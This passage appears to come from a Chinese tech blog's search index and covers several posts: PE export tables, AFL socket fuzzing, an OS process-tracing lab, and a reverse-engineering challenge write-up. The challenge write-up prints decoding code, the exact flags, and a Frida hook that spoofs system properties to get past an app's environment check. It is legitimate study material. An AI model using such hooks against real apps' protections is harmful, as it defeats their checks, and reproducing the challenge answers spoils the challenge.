80C)\n从这个EXE文件可以看到INT与IAT数据和长度相同，都指向了IMAGE_IMPORT_BY_NAME结构数组。\nEAT EAT是一种核心机制，可以使不同的应用程序可以调用库文件中提供的函数。也就是说，只有通过EAT才能准确求得相应库中导出函数的起始地址。\nPE文件中有且仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。用来说明IAT的IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且拥有多个成员。是因为PE文件可以导入多个库\nIMAGE_EXPORT_DIRECTORY 1 2 3 4 5 6 7 8 9 10 11 12 13  typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; // 未使用，总为0  DWORD TimeDateStamp; // 文件创建时间戳  WORD MajorVersion; //未使用，总为0  WORD MinorVersion; // 未使用，总为0  DWORD Name; //重要 指向一个代表此 DLL名字的 ASCII字符串的 RVA  DWORD Base; // 重要 函数的起始序号  DWORD NumberOfFunctions; // 重要 导出函数地址表的个数  DWORD NumberOfNames; // 重要 以函数名字导出的函数个数  DWORD AddressOfFunctions; // 重要 导出函数地址表RVA  DWORD AddressOfNames; //重要 导出函数名称表RVA  DWORD AddressOfNameOrdinals; //重要 导出函数序号表RVA } IMAGE_EXPORT_DIRECTORY, //PIMAGE_EXPORT_DIRECTORY;   前四个成员基本没有用，我们需要特别关注后面的成员。\n导出函数就是将功能提供给外部使用的函数，如果一个PE文件导出了函数，那么这个函数的信息就会记录在PE文件的导出表中，方便外部程序加载该文件进行动态调用。\n有时函数在导出表中只有一个序号而没有名字，也就造成了导出表中有了三个字表的存在，分别是导出地址表、导出函数名称表、导出函数序号表，这样外部就可以通过函数名称和函数序号两种方式获取该函数的地址\n AddressOfFunctions 4字节的RVA地址，可以用来定位导出表所有函数的地址表，这个地址表可以当作一个成员宽度为4的数组进行处理，长度由NumberOfFunctions进行限定，地址表中的成员也是一个RVA地址 AddressOfNames 4字节RVA地址，可以用来定位导出表中所有函数的名称表，可以用来当作成员宽度为4的数组进行处理，长度由NumberOfFunctions进行限定，在FileBuffer状态下需要进行RVA到RAW的转换才能真正找到函数名称 AddressOfNameOrdinals 这个值是一个4字节的RVA地址，他可以用来定位导出表中所有函数的序号表，这个序号表可以当作一个成员宽度为2的数组进行处理，它的长度由NumberOfNames进行限定，名称序号表的成员是一个函数序号，该序号用于通过名称获取函数地址。 NumberOfFunctions 这个值并不是真的函数数量，而是通过函数序号表中最大的序号减去最小的序号再加上1得到的，例如，一共导出3个函数，序号分别是：0、2、4，NumberOfFuctions = 4 - 0 + 1 = 5  通过导出表查找函数地址的两种方法：\n  通过函数名查找函数地址：\n 首先定位函数名表，然后通过函数名表中的RVA地址定位函数名，通过比对函数名获取目标函数名在函数名表中的索引 通过获取函数名表的索引获取函数序号表中对应索引中的数组元素，也就是函数序号 通过把该序号当作函数地址表的下标，就可以获得下表中的函数地址。  详细过程如下图\n   通过函数序号查找函数地址\n 首先计算函数地址表的索引：idx = 目标函数的函数序号 - 导出表的Base(结构体的一个成员) 通过计算出的索引就可以在函数地址表中获取到目标序号的函数地址。  此方法不需要使用函数名称表和函数序号表就可以直接获取函数地址。\n过程如下图\n  我们通过例子来熟悉导出表查找函数的过程\n 查找函数名称表  首先需要查到EXPORT Directory的RVA，然后转化成RAW。这一步就查看DataDirectory即可。跳过，得到的IMAGE_EXPORT_DIRECTORY的结构体数据如下\n查找函数名称并获得其在函数名称表的索引  NumberOfNames为 3B9，AddressOfNames 成员值为 RVA = 3538，RAW = 2938，查看该地址\n选择RVA = 4BBC =\u0026gt; RAW = 3FBD的数据进行查看，\n即为AddConsoleAliasA这个库函数的名称，其在函数名称表里索引为2.\n查看函数名称序号表  再将索引作为函数名称序号表的索引，并获取这个索引下数组的内容，这里AddressOfNameOrdinals 的 RVA 为441C =\u0026gt; RAW 为381C，查看函数名称索引表内容如下\n因为索引为2，因此在函数名称序号表读取数组第三个元素的值，为02\n通过函数地址表查找计算实际虚拟地址  AddressOfFunctions成员的值为RVA = 2654 =\u0026gt; RAW = 1A54，查看该地址数据如下\n获取的函数序号为02，查找函数地址表的第三个数组内容，RVA = 000326D9\n我们通过查看Kernel32.dll的ImageBase = 7C800000 (ImageBase的值存在可选头的结构体中)，然后计算AddConsoleAliasA函数的实际虚拟地址，(7C800000 + 326D9 = 7C8326D9)，使用Ollydbg查看0x7C8326D9地址的指令得到如图\n则该处就为AddConsoleAliasA函数的实际虚拟地址。\n结束 到此，PE文件结构就学习结束了，自己学习一段时间后再回过头来通过博客的方式复习和加强PE文件结构的知识点，为逆向进阶打好基础，但又因为时间缘故，还有其他较为重要的事情需要做，不能完成做一个自己的控制台PE查看器的任务。对于PE文件来说还有重定位表，绑定导入表，资源表等，我还没学！！！我学了我加上来！！！！写不动了！！！！学不动了！！！\n重定位表的部分知识已补上，在博客《常用DLL注入技术解析》中0x5 ReflectiveInjection部分中详细分析。\n","permalink":"http://int80.top/pe_structure_analysis/","tags":["PE文件"],"title":"PE文件结构解析"},{"categories":["逆向"],"contents":"第五题：\n**任务：**找到FLAG，也就是APP正确的账号密码\n步骤：\n先打开APP看看运行出现的东西，\n将apk用jadx打开，并查看com.example.test.MainActivity的代码\n其中可以发现关键的函数，即Encrypt.b ，Encrypt.a，getBytes\n后面的if中调用equals函数可知，该代码的作用就是对输入的账号密码通过Encrypt类的a和b函数进行加密，然后与正确的加密后的账号密码比对是否相等。\n那么只需要将bArr以及第一个equals中new byte[]的字节数组进行解码即可。\n首先查看Encrypt类\n加密的方法很简单，先将输入的账号密码和 i 进行异或，在调用Base64的库函数进行Base64编码。\n那么获得正确的账号密码的方法就很明显了，直接将程序中列出来的两个字节数组先进行Base64的解码，在和 相同的 i 进行异或即可。\n这里通过java来进行解密，还需了解一下 Base64库的decode函数的使用，就是喂一个字节数字数组，通过Base64加密返回一个 字节字符数组。\nJAVA解密代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  package com.example.helloworld; import java.util.Base64; public class HelloWorld { public static void main(String[] args) { Base64.Decoder decoder = Base64.getDecoder(); byte[] data = {78, 106, 73, 49, 79, 122, 65, 51, 89, 71, 65, 117, 78, 106, 78, 109, 78, 122, 99, 55, 89, 109, 85, 61}; byte[] data1 = {89, 87, 66, 108, 79, 109, 90, 110, 78, 106, 65, 117, 79, 109, 74, 109, 78, 122, 65, 120, 79, 50, 89, 61}; byte[]bArr = decoder.decode(data); byte[]bArr1 = decoder.decode(data1); System.out.println(); int length = bArr.length; for (int i2 = 0; i2 \u0026lt; length; i2++) { bArr[i2] = (byte) (bArr[i2] ^ 3); bArr1[i2] = (byte) (bArr1[i2] ^ 3); } String res = new String(bArr); String res1 = new String(bArr1); System.out.println(res); System.out.println(res1); } }   程序输出得到：\n1 2  516834cc-50e448af bcf9ed53-9ae4328e   提交FLAG时需合并成：\n1  516834cc-50e448af-bcf9ed53-9ae4328e   第六题：\n一开始看到第六题的网址和第五题一样，还以为是网址放错了，但是几天后还没有更新，于是就考虑到是不是第六题的flag也在第五题给的APP中，于是反编译该app，得到的lib文件中存在libMylib.so文件，于是推测第六题flag在so文件里。\n我一开始打算用IDA动态调试so文件，但是一attach进程，APP就会直接关闭，我怀疑APP用了什么反调试方法，于是直接IDA打开so文件，查看是否有相关的反调试代码，结果并没有发现，反而发现了关键的产生flag的代码。\n用IDA打开libMylib.so文件，并查看EXPORTS窗口，导出的函数如下：\n双击JNI_Onload，并且翻到最顶，查看如下注释：\n查看标黑的，可以看到该so文件依赖了以上几个so库，并且这个so文件的名字为libMylib.so。我们需要注意libc.so这个依赖库，因为关键的函数从这个库里调用的。\n再次回到JNI_OnLoad函数处，将汇编转为C语言，如下：\n可以看到，该函数注册了MainActivity，并且在下面调用了一个all的函数，双击进去，会发现还有一个all函数被调用，再次进入，我们就能得到如下代码(只截图关键部分)\n第一个if，判断条件虽是数字，但其实是ASCII码，其意思就是判断abi是否是’x86‘，release-version是否为’9‘，接着打开了/data/2233文件，并且后面需要a+的权限，结合后面的fput，应该是要把一些数据写入该文件，那么还需要再/data处创建2233文件，此处需要root才能访问，也需要APP获得root权限才能写入。\n那么关键的就是如何绕过第一个if了，v16，v17的值为__system_property_get函数的返回值，因此我们需要对该函数进行hook，更改其返回值即可。\n因为hook需要知道该函数所在so文件，我们查看IMPORT窗口\n可以看到__system_property_get是从libc.so导入的。\n那么接下来用frida进行hook注入，注入代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  function main() { Java.perform(function(){ var str; var arg; //findExportByName是获得__system_property_get函数再libc.so中的地址  Interceptor.attach(Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;__system_property_get\u0026#34;), { onEnter: function (args) { //此处的args为函数调用时传入的参数  str = Memory.readCString(args[0]); //获得abi或version  arg = args[1]; //保存返回值的变量  if(str.indexOf(\u0026#39;ro.product.cpu.abi\u0026#39;)!=-1||str.indexOf(\u0026#39;ro.build.version.release\u0026#39;)!=-1){ //如果有这两个字符串  console.log(\u0026#34;now hook \u0026#34;+str) } }, onLeave: function (retval) { if(str.indexOf(\u0026#39;ro.product.cpu.abi\u0026#39;)!=-1){ var old_abi = Memory.readCString(arg); Memory.writeUtf8String(arg, \u0026#34;x86\u0026#34;); //直接向内存地址写入x86  var new_abi = Memory.readCString(arg); console.log(\u0026#39;old_abi is:\u0026#39;,old_abi,\u0026#39;new_abi is:\u0026#39;,new_abi); }else if(str.indexOf(\u0026#39;ro.build.version.release\u0026#39;)!=-1){ var old_ver = Memory.readCString(arg); Memory.writeUtf8String(arg, \u0026#34;9\u0026#34;); //直接向内存地址写入9  var new_ver = Memory.readCString(arg); console.log(\u0026#39;old_ver is:\u0026#39;,old_ver,\u0026#39;new_ver is:\u0026#39;,new_ver); } } }); }); } setImmediate(main);   打开APP，然后在命令行执行\n1  frida -U --no-pause -f com.example.test -l hook.js   frida运行后得到如下结果：\n检验是否hook成功，打开2233文件查看，结果如下：\n总共16行，那么根据第五题的结果，可以推测出flag为4行一组，’-‘隔开，结果为：\n1  b13981f4-5ae996d4-bc04be5b-34662a78   ","permalink":"http://int80.top/bili1024_21/","tags":["逆向"],"title":"B站1024逆向题"},{"categories":["Fuzz"],"contents":"任务：给AFL添加socket发包功能，使其支持测试DNS协议\n参考代码：\n因为不太方便直接贴出源码，所以就说明一下思路，记录一些实现 时遇到的错误。\n主要的问题有：\n 写了发包的函数，需要在哪里调用？ 如何解决超时的问题？如何及时杀死子进程？ 如何配置dnsmasq？？？？？？？？？（弄这玩意给我重装系统了）  需要了解的知识点：\n AFL大概的执行流程 AFL的从哪里获得输入文件 AFLmain函数的死循环在执行什么 target如何获取输入文件 fuzz dns的结果afl是通过什么 途径获取的 管道的概念  afl的main函数大概执行流程：\n通过read_testcases从输入文件夹读取所有文件，然后进行排队进行测试，然后调用add_to_queue函数创建queue_entry结构体作为输入文件队列，通过perform_dry_run函数第一次运行测试样例。进入死循环就循环将输入队列当前的输入文件丢入fuzz_one函数处理，该处理就是将种子变异并添加到输入队列里去。\nrun_target函数就是fork出一个子进程(fuzz的目标程序)进行fuzz。那么socket发包函数的调用就需要在这个位置。run_target函数被调用的地方存在于main函数死循环中的多个函数中，有calibrate_case函数等。\nsocket发包函数就在定时器设定好后面加即可。原因会在后面信号处理相关解释。\n既然要通过socket发送输入文件，那么从哪里获取输入文件呢？\nwrite_to_testcases函数就是用来写入到输入文件中的，该函数的参数为void *mem 和 u32 len，那么就定义两个个全局变量用来获取mem和len来给socket发送即可。\nsocket发包函数就是普通的socket client的代码，要注意的就是发送了输入文件后，就应该终止该子进程了，那么如何关闭呢？\n下面是对信号及信号量处理的解释（这是避免超时的解决办法）\nSIGTERM：\n程序结束信号，与SIGKILL不同的是，该信号可以被阻塞和处理，通常用来要求程序自己正常退出。\n下面这段程序是在socket发包程序当中的。是在关闭了socket后，才运行来结束子进程的。\n第一个if用来判断子进程是否还存在，存在则通过kill函数传递SIGTERM信号告诉进程运行完了就快结束。\nwhile（1）作用是用来检验子进程是否还在运行，kill函数的第二个参数为0时，说明没有任何信号发送出去，但是系统会执行错误检查，通常利用第二个参数为0来检验某个进程是否在执行.当kill错误执行就会返回-1，并且errno会被赋值为ESRCH，即目标进程或进程组不存在。\n所以当发包，关闭socket后，执行该终止子进程的语句才能避免超时，才能在第一次perform_dry_run顺利通过。\n问题：但是如果没能杀死子程序不久进入死循环了吗？\n答：这就是后面设置定时器的原因，SIGTERM不一定能杀死程序，所以设置定时器来SIGKILL 子进程\n为什么send_over_network 要放在runtarget 设置好定时器后。\n因为AFL中定义了进程接收到信号SIGALRM后会执行的函数为\n即超时后会给子进程发送SIGKILL信号进行终止运行。而send_over_network 发包目标是子进程(target)，因此需要先设置好定时器，在子进程创建和运行超时时能及时kill掉避免过长时间的运行影响整体FUZZ的速度\n在run_target中还添加了第二个if，获取子进程终止的信号，因为我们在send_over_network中添加了kill 子进程的信号为SIGTERM 所以加入了这一句 FAULT_NONE，否则他将会直接返回FAULT_CRASH会产生错误的结果\n该次任务 只是实现了TCP的socket发包，那如果添加TCP和UDP的两种选项呢。\n有一种思路就是通过getopt添加命令行选项，并在case中添加相应的执行语句即可。例如输入参数为TCP:127.0.0.1，那么添加命令行选项-N ，那么命令行输入-N TCP:127.0.0.1 在case执行自己的拆解字符串的函数即可。socket发包的代码段添加if进行分支执行即可。\n最后结果：\n","permalink":"http://int80.top/afl_add_socket/","tags":["Fuzz"],"title":"AFL添加socket发包功能"},{"categories":["操作系统"],"contents":"lab3 一、任务内容  基于模板process.c编写多进程的样本程序，实现以下功能：  所有子进程都并行运行，每个子进程实际的运行时间不超过30秒 父进程向标准输出打印所有子进程的id，并且在所有子进程退出后才退出   实现进程运行轨迹的跟踪。在内核中维护一个日志文件process.log，把从操作系统启动到系统关机过程中所有进程的运行轨迹都记录在这一log文件中 统计log文件记录该程序建立的所有进程的等待时间，完成时间(轮转时间)和运行时间，计算平均等待时间，平均完成时间，和吞吐量。 修改进程调度的时间片，运行同样的样本程序统计同样的时间数据，和原有的情况对比，体会时间片带来的差异  二、明确进程的概念以及其生命周期内运行过程 那么何为进程呢？\n操作系统为正在运行的程序提供的抽象，就是进程，是操作系统提供的基本抽象\n非正式定义可以定义为，正在运行的程序。但程序本身是没有生命周期的，他只是存在磁盘上的一些指令或者静态数据，是操作系统让这些字节运行起来，让程序发挥作用。\n我们通过清点一个运行的程序在执行过程中访问或影响的系统的不同部分，从而概括一个进程。\n这里引入一个新的概念，进程的机器状态(machine state)：程序运行时可以读取或更新的内容。\n因此我们要关注，任何时刻下，机器哪些部分对执行该程序很重要。\n我们知道存放在内存的程序才能被运行，因此组成机器状态的重要的部分就是内存。指令存放在内存中，正在运行的程序读取和写入的数据也存在内存中，因此进程能访问的内存就是该进程的一部分。\n进程的机器状态另一部分就是寄存器。因为很多指令都是明确的读取或更新寄存器，所以寄存器对程序的执行很重要。\n进程创建的一些细节：\n操作系统运行程序第一件事就是讲代码和所有静态数据加载到内存中，加载到进程的地址空间中。\n早期操作系统中，加载这个过程需要尽早完成，即在运行程序之前全部完成。\n但随着现在程序越来越大，内存根本不可能一次性存放如此大的程序。你看现在的游戏都是10G以上，而我们的内存可能是8G,16G等，所以大多时候内存的大小无法载入整个程序。\n因此，现代操作系统惰性地(lazily)执行该过程，也就是仅在程序执行期间需要加载的代码或数据片段，才会加载到内存当中。换句话说我用谁我让谁进入内存，当内存满了之后我根据我的调度策略，将该换出去片段换出去，再把要用的片段加载进来。(这部分需要了解分页和交换的机制)\n当我们把程序载入到内存后，操作系统还会自动为程序分配运行时栈(run-time stack or stack)\n操作系统也可能会为程序的堆分配内存，这需要用户主动的显式的申请，例如malloc()这样的调用来申请空间，再通过free()释放内存。\n在UNIX系统中，每个程序都会有三个文件描述符，分别是标准输入stdin，标准输出stdout，标准错误stderr。所以操作系统还会初始化一些其他的任务，例如I/O相关的任务。\n完成上述任务后，PC指针就指向程序main函数入口地址，开始执行程序。\n总结就是：操作系统要执行一个程序，首先将代码和静态数据载入内存，通过创建和初始化栈及执行与I/O设置相关的其他工作，最后OS开始执行程序入口函数。\n我们这里简单提一下 堆和栈的区别：\n我接触到栈和堆的时候，是学习数据结构的时候，当时对堆的说明只是能够自动排序的一种数据结构。与数据结构不同，这里的堆分配方式类似于链表，因此获得的地址空间可以不连续\n在内存当中，\n栈是由系统自动分配自动释放(出栈时)，且地址空间连续。用于存放函数的参数值，局部变量的值。因为是机器自动执行，且是系统提供的数据结构，机器语言层有专门的执行指令，所以栈的执行效率更高于栈。其地址增长方向是，高地址向低地址增长\n堆一般由程序员分配释放，因此我们能申请任意多少的内存(受限于计算机系统中的虚拟内存)，动态内存的生存期也是由程序员自己决定的。如果在堆上分配的了内存地址就必须释放它，否则会导致运行的程序出现内存泄漏的情况。其地址增长的方向从下往上，即低地址向高地址增长。\n我们知道进程是不断切换着运行的，但是我们的内存和寄存器只能留给需要执行的程序，当我们切换进程的时候自然就会需要保存\u0026quot;现场\u0026quot;，那么当我们再次切换回来的时候才能让程序继续以切换之前的状态运行。所以操作系统充满了各种数据结构用来处理各种情况，在我们讨论的这个情况，操作系统就有一个称为进程控制块PCB(Process Control Block)的数据结构，用来存储关于进程的信息的个体结构。\n对于停止的进程，寄存器上下文(寄存器取值所基于的语境)将保存其寄存器的内容。所以当进程停止时，寄存器将被保存到这个内存位置。这句话可能说的不是特别清楚。\n当程序挂起的时候，我们观察的寄存器都是存放在内存中的寄存器的值，而不是物理寄存器当前的值，当我们修改寄存器的时候也是修改内存中的寄存器值。\n当线程切换时，系统会将要挂起线程的寄存器值保存到内存中，这个记录就被称为线程上下文，寄存器上下文即线程上下文的一部分。将现成的寄存器存放在内存中，称为上下文记录\n根据PCB记录\u0026quot;现场\u0026quot;，我们就能还原\u0026quot;现场\u0026quot;，实现进程的切换。\n至此，进程的一些基本内容就概述完成，那么我们该来想想如何才能创建多进程呢？\n我们需要调用fork()系统调用来创建子进程。这里对fork()进行一些概述\nfork()创建一个进程，该进程称为子进程，原进程称为父进程。当我们执行该调用，系统会分配出新的内存空间，并将父进程的所有值都复制给子进程，只有少量的值于原来的进程的值不同，以区分两个为不同的进程。我们可以理解是一个克隆。（这里提一点，如果我们不更改子进程的优先级，那他将和父进程的相同，我们也是通过父进程的优先级的值来赋值给子进程的时间片。）\n我们写的process.c代码，计划在里面创建4个进程，那你可能会想，哎？我创建了4个子进程，他们会执行什么程序？和父进程相同，所以他们也在执行父进程的程序吗？\n对的，子进程会从调用fork()的位置开始继续往下执行。也就相当于fork()只会拷贝下一段要执行的代码到子进程中。\n这里需要说一下fork()的特别的机制。\nfork()调用一次，并成功创建新进程，它能返回两个值，失败则返回一个负值(-1吧，不过这个暂时不重要)\n那么这两个值分别是什么呢？在父进程中，fork返回新创建子进程的进程ID，在子进程中，fork返回0.你可以这么理解，父子进程是一棵多叉树(只有一个子进程可理解成一串链表），父进程指向子进程的id，而子进程指没有指向则为0.\n所以我们会看到这样的判断\n1 2 3 4 5 6 7 8  pid_t pid; pid = fork(); if(pid!=0){ printf(\u0026#34;I am parent %d\u0026#34;,getppid()); } else if(pid==0){ printf(\u0026#34;I am child %d of parent %d\u0026#34;,getpid(),getppid()); }   然后屏幕两个输出都出现了，这里不用疑惑，我们还在执行另一个进程来跑相同的程序呢，父进程得到的是0，所以进入了第二个if，子进程得到的是他的进程id进入了第一个if，所以我们能看到两个输出都出现了。\n那么多进程创建就解决了，我们再来想想如何让父进程等待子进程全部结束后再结束呢？\n在这之前，我们需要知道为什么父进程会需要等待子进程结束再结束(当然，在这我们是想要他这么做，但也有值得这么做的理由)\n我们使用wait()系统调用，让父进程立即进入阻塞状态，然后wait()自动分析当前进程的某个子进程是否已经运行完成，当wait找到这样的僵尸子进程后，wait就会收集子进程的信息(例如退出原因)和回收子进程残留资源，并将该子进程彻底销毁后返回该进程的进程id。当wait一旦被调用，就会一直阻塞，直到有一个子进程退出为止\n何为僵尸子进程？\n当一个进程运行结束后，会关闭所有文件描述符，释放在用户空间分配的内存，但进程留在PCB的信息没有被同步删除。而执行完却没从PCB中删去进程信息的子进程称为僵尸子进程.\n那么为什么要删除僵尸进程呢？僵尸进程明明不做任何事，不会使用任何资源也不会影响其他进程了啊，为什么还要去管他呢。但PCB内的信息也都是存放在内存中的，如果存在太多僵尸进程也会导致一些问题。你可以想象一个工厂里面，有一些人啥也不做，你也不用支付工资，但人数多了后，仍让会导致你的工厂变得拥挤从而导致其他的人难以正常工作。\n所以回到原来的问题，我们通过wait()让父进程阻塞，等待全部子程序结束后再结束父进程。\n以上，我们创建多进程的程序就已经有了整体的框架和思路了。\n我们现在要考虑，如何创建一个日志呢？如何让他从操作系统启动后就跟着启动并开始记录进程的活动轨迹呢？\n容易想到，那我们在操作系统开机的时候就打开日志文件不就行了吗？对，确实是这样做，但问题在于要如何处理？\nLinux中，一切都能抽象为文件，那么对于一个打开的文件，我程序应该如何找到呢？完成这功能的便是通过文件描述符，所以我们要打开日志文件就需要关联文件描述符。我们知道，在Linux中文件描述符0、1、2分别关联了标准输入stdin、标准输出stdout和标准错误stderr，因此我们将文件描述符3关联到process.log日志文件即可。有一点需要注意，因为我们要今早打开日志文件记录所有进程的运行轨迹，我们需要将关联的代码提前到进程0运行还没创建进程1的时候就完成，这部分会在实践部分详细展开说。\n那么接下来就是我们要在什么地方加入写入日志文件的代码了。\n我们要清楚，进程，它能处于几种状态？可以认为其有三种状态\n运行：进程正在处理器上运行，进程在执行指令\n就绪：进程已经准备好运行，但操作系统因为一些原因并不打算在此时运行\n阻塞：一个进程执行了某种操作，知道发生其他事件时才会准备运行。例如一个进程需要操作IO设备时候，该进程就会进入阻塞状态，因为I/O设备反应时间远慢于CPU运行的速度，所以此时进程阻塞放出CPU的操作权，从而提高CPU的利用率\n但我们在这里再加上两个状态：创建和退出\n我们用如下字母进行替代：新建(N),就绪(J),运行(R),阻塞(W),退出(E)\n最后我们就要考虑，再哪些位置进行进程的监测，并把检测信息输入到日志文件中。\n因为fork()系统调用后，进入内核，所以进程的轨迹的监测，我们需要在内核中完成，那么write()这个系统调用我们就没办法使用了，所以写数据进文件的函数，我们需要解决。因为这部分编程较为困难，就直接使用现成的代码。\n我们将重点放在在哪里进行进程轨迹监测。\n对于创建(N)，我们需要找到创建进程的函数copy_process()，其位于fork.c内核文件中，并在创建的时候将信息写入日志文件\n对于运行(R)，就绪(J)，阻塞(W)，我们需要考虑在涉及到调度策略的代码中进行，即内核文件中的sched.c\n退出(E)就考虑再内核文件中的exit.c文件中这种状态才会出现。\n三、实践部分 (代码是自己再打一遍的，可能会有一些人为错误，有的话还希望指出)\n首先先编写能生成多进程的程序process.c\n该程序包含两个部分，第一个部分是多进程创建的代码，第二部分是获取该进程使用CPU的时间以及模拟I/O操作的代码\n下面这段是第二部分代码：\n先放出第二部分代码是因为，第一部分的代码需要用到第二部分的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  /* * 此函数按照参数占用CPU和I/O时间 * last: 函数实际占用CPU和I/O的总时间，不含在就绪队列中的时间，\u0026gt;=0是必须的 * cpu_time: 一次连续占用CPU的时间，\u0026gt;=0是必须的 * io_time: 一次I/O消耗的时间，\u0026gt;=0是必须的 * 如果last \u0026gt; cpu_time + io_time，则往复多次占用CPU和I/O * 所有时间的单位为秒 */ void cpuio_bound(int last, int cpu_time, int io_time) { struct tms start_time, current_time; clock_t utime, stime; int sleep_time; while (last \u0026gt; 0) { /* CPU Burst ，指CPU执行指令的那一段时间区间*/ times(\u0026amp;start_time); /* 其实只有t.tms_utime才是真正的CPU时间。但我们是在模拟一个 * 只在用户状态运行的CPU大户，就像“for(;;);”。所以把t.tms_stime * 加上很合理。*/ /*用来模拟cpu_time时间内使用CPU */ do { times(\u0026amp;current_time); utime = current_time.tms_utime - start_time.tms_utime; stime = current_time.tms_stime - start_time.tms_stime; } while ( ( (utime + stime) / HZ ) \u0026lt; cpu_time ); last -= cpu_time; if (last \u0026lt;= 0 ) break; /* IO Burst ，指I/O设备被请求执行开始到执行结束的时间区间*/ /* 用sleep(1)模拟1秒钟的I/O操作 */ sleep_time=0; while (sleep_time \u0026lt; io_time) { sleep(1); sleep_time++; } last -= sleep_time; } }   cpuio_bound(10,1,1)意思为该进程，轮转一次使用CPU时间为1s，I/O设备占用时间1s，占用CPU和I/O时间总共为10秒\n下面是第一部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;time.h\u0026gt;#include \u0026lt;sys/times.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt; #define HZ\t100 #define CHILD_PROCESS_NUM 4 #define CHILD_RUN_TIME 30  void cpuio_bound(int last, int cpu_time, int io_time); /* 1. 所有子进程都并行运行,每个子进程的实际运行时间一般不超过30秒; 2. 父进程向标准输出打印所有子进程的id,并在所有子进程都退出后才退出; */ int main(int argc, char * argv[]) { pid_t pid; /*子进程 PID*/ int i=0; while(i\u0026lt;CHILD_PROCESS_NUM) { /*子进程*/ if((pid=fork())\u0026lt;0) /*fork 失败*/ { fprintf(stderr,\u0026#34;error in fork()\\n\u0026#34;); return -1; } /*成功创建子程序，子程序将执行下面的代码*/ else if(pid==0) { fprintf(stdout,\u0026#34;create new process [%lu]\\n\u0026#34;,(long)(pid)); cpuio_bound(CHILD_RUN_TIME,1,i);/*用i是为了不断改变I/O使用时间*/ exit(0); /*退出子程序*/ } /*父进程执行下面代码*/ else { fprintf(stdout,\u0026#34;child pid is [%d] and parent pid is [%d]\\n\u0026#34;,getpid(),getppid()); i++; } /*父进程继续循环fork*/ } /*等待所有子进程完成*/ /*因为当一个子进程结束后就会返回他的id，如果没有子进程就会返回-1，所以当要等待多个进程结束，就需要while((pid=wait(NULL))！=-1)，这样当所有子进程结束后，父进程才会结束运行 */ while((pid=wait(NULL)) != -1) { fprintf(stdout,\u0026#34;process [%lu] terminated\\n\u0026#34;,(long)(pid)); } return 0; }   那么我们创建多进程的程序完成，现在要考虑创建日志文件process.log。\n首先我们日志放在/var/process.log，作用使在每个进程发生状态切换的时候向log文件内写入一条记录，但因为在内核态写入，这个过程和用户态应用程序在一些细节上差别就很大。\n首先是打开log文件，我们是要让操作系统第一次调用fork()建立进程1的时候就开始记录了，那么我们log要在这之前打开才能记录进程1的信息。\n我们先查看操作系统第一次fork()的代码，内核入口为init/main.c 中的main()，里面有一段代码\n1 2 3 4 5 6  //... move_to_user_mode(); /*切换到用户模式*/ if(!fork()){ /* we count on this going ok */ init(); } //...   这段代码是在进程0运行的，首先要切换到用户模式，才全系统第一次调用fork()建立进程1，进程1调用init()函数，我们进入init()中查看\n1 2 3 4 5 6 7 8 9  //... /*加载文件系统 */ setup((void *) \u0026amp;drive_info); /*打开/dev/tty0，建立文件描述符0并和/dev/tty0相关联 */ (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); /*让文件描述符1也和/dev/tty0关联*/ (void) dup(0); /*让文件描述符2也和/dev/tty0关联*/ (void) dup(0);   dup(oldfd)用来复制参数oldfd所指的文件描述符。当复制成功时，返回最小的尚未使用的文件描述符，若有错误就返回-1，错误代码存入errno中。返回的新文件描述符和参数oldfd指向同一个文件，这两个描述符共享同一个数据结构，共享所有的锁定，读写指针和各标志位。\n我们前面说过文件描述符分别代表了什么，这就不赘述。那么就应该紧接着建立文件描述符3和process.log日志文件相关联\n建立方式同tty0文件\n1 2  /*O_CREAT如果文件不存在就创建，并使用参数3设置权限；O_TRUNC若文件存在则清除文件内容并设置文件大小为0;O_WRONLY以只写方式打开文件；0666就是文件操作的权限值，和第二个参数有关*/ (void) open(\u0026#34;/var/process.log\u0026#34;,O_CREAT|O_TRUNC|O_WRONLY,0666);   我们知道init()函数是在fork()后才进行，为了能记录进程1，我们需要将文件描述符关联文件的这步放到fork()前面，但必须在move_to_user_mode();后，因为必须先移动到用户模式，才能加载文件系统，因此需要在这之后添加代码，不能再在前面添加了。因此更改后如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  //... move_to_user_mode(); /*切换到用户模式*/ //... /*加载文件系统 */ setup((void *) \u0026amp;drive_info); /*打开/dev/tty0，建立文件描述符0并和/dev/tty0相关联 */ (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); /*让文件描述符1也和/dev/tty0关联*/ (void) dup(0); /*让文件描述符2也和/dev/tty0关联*/ (void) dup(0); (void) open(\u0026#34;/var/process.log\u0026#34;,O_CREAT|O_TRUNC|O_WRONLY,0666) if(!fork()){ /* we count on this going ok */ init(); } //...   还要记得把init的这部分给注释掉，因为进程1继承了进程0这个父进程的绝大部分东西，所以进程1也会继承这些文件描述符.\n那么日志文件就能在全系统第一次调用fork()之前创建了，因此能监测各进程的各种状态变化了\n日志文件建立了，那是不是该考虑如何写入log文件了呢？之前说过我们在内核中切换进程，导致进程状态改变，也就是说所有的状态转移是在内核进行的，那么我们也得在内核向日志文件写入这些改变信息，但是我们在内核没有办法使用write()这个系统调用，所以我们要考虑自己写一个写入函数，就像printf()在内核中有个printk()来替代它的功能，我们就要写一个在内核使用的write()。\n因为内核函数的编写涉及到C内嵌汇编，编写难度较大，因此我们直接套用现成的代码，主要是参考printk()和sys_write()写出来的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 